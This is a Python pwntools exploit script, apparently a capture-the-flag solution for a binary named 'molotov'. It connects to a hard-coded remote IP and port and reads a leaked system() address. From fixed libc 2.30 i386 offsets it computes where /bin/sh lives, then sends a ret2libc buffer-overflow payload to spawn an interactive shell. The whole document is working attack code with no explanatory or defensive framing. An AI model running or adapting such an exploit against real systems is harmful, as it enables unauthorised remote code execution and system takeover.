from pwn import *

#r = process("./molotov")
r = remote("54.210.217.206",1240)

system_address = int(r.recvline()[:-1],16)

#current libc: libc6_2.30-0ubuntu2_i386
#if you want to try others libc versions, change offsets.
system_offset = 0x458b0		
bin_sh_offset = 0x19042d

#creating payload
payload = "A"*32
payload += p32(system_address)
payload += "AAAA"
payload += p32(system_address-system_offset+bin_sh_offset) #address of /bin/sh

r.sendlineafter("Input :", payload )

#switching to interactive mode. If exploit is correct, we'll get a shell.
r.interactive()
